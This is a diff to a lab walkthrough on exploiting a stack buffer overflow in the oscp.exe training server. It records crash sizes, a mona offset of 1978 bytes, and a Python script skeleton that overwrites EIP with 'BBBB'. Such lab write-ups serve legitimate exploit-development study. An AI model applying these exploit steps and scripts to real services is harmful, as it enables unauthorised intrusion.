@@ -108,11 +108,15 @@ while True:
         
     - ![image](https://user-images.githubusercontent.com/94720207/169674167-39262a16-968f-40c1-a052-d7fd0f302d61.png)
  
-        - << **Crashed at: `2000 bytes` (A * 2000)** >> /// Note: Restart the Lab after the crash. 
+- **Results:**
+
+- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
+        
+    - _Note: Restart the Lab after the crash._ 
 
 ---
 
-### 2.1 Crash Replication3 & 2.2 Controlling EIP
+### 2. Crash Replication
 
 - Run the following command to generate a cyclic pattern of a length `2400 bytes` longer **(2000+400)** that the string that crashed the server (change the -l value to this):
 
@@ -155,11 +159,25 @@ except:
   print("Could not connect.")
 ```
 
+- ![image](https://user-images.githubusercontent.com/94720207/169674365-430369ec-0bd2-4989-84a4-688a2cccdf3b.png)
+
+    - **Execute it:**
+
+        - **`overflow1_step2.1_CrashReplication.py`**
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169674431-bafa5cbc-a013-4ea0-891a-65af5359d3f5.png)
+        
+    - ![image](https://user-images.githubusercontent.com/94720207/169674447-06bbf9c3-4c89-4f99-b335-b8dd727d3254.png)
+ 
+        - << **Crashed at: `2000 bytes` (A * 2000)** >> 
+        
 - The script should crash the `oscp.exe` server again. 
 
 - This time, in `Immunity Debugger`, in the **command input box at the bottom of the screen**, run the following **mona command**, changing the distance to the same length as the pattern you created:
 
-    - `!mona findmsp -distance 600`
+    - `!mona findmsp -distance 2000`
+    
+    - ![image](https://user-images.githubusercontent.com/94720207/169674704-3a488180-4293-47e3-9c72-a9c892c37a39.png)
     
 - Mona should display a log window with the output of the command. 
 
@@ -167,23 +185,33 @@ except:
 
 - In this output you should see a line which states:
 
-    - `EIP contains normal pattern : ... (offset XXXX)` 
-    
-1. Update your `overflow1_step2_exploit.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**. 
+    - `EIP contains normal pattern : ... (offset XXXX)`
+
+- **Results:**
+
+- << **Initial Crash at: `2000 bytes` (A * 2000)** >> 
+
+- << **Exact Offset for Crash: `1978 bytes` (A * 1978)** >> 
+
+    - _Note: Restart the Lab after the crash._
+
+---
+
+### 3 Controlling EIP
+
+1. Update the python script with a new called `overflow1_step3_controllingEIP.py` script and set the `offset` variable to the value showed by `mona` `EIP offset` **(was previously set to 0)**.
+  
+    - Offset: `1978` bytes 
 
 2. Set the `payload` variable to an **empty string again**. 
 
 3. Set the `retn` variable to `BBBB`.
 
-4. Restart `oscp.exe` in `Immunity Debugger` and run the modified `overflow1_step2_exploit.py` script again. 
-
     - The `EIP` register should now be overwritten with the 4 B's **(BBBB)** `42424242`. 
 
 - Create:
 
-    - `overflow1_step2_exploit.py` (chmod +x)
-
-        - **Exploit Script Ready:**
+    - `overflow1_step3_controllingEIP.py` (chmod +x)
 
 ```python
 import socket
@@ -192,7 +220,7 @@ ip = "192.168.1.100"
 port = 1337
 
 prefix = "OVERFLOW1 "
-offset = 0
+offset = 1978
 overflow = "A" * offset
 retn = "BBBB"
 padding = ""
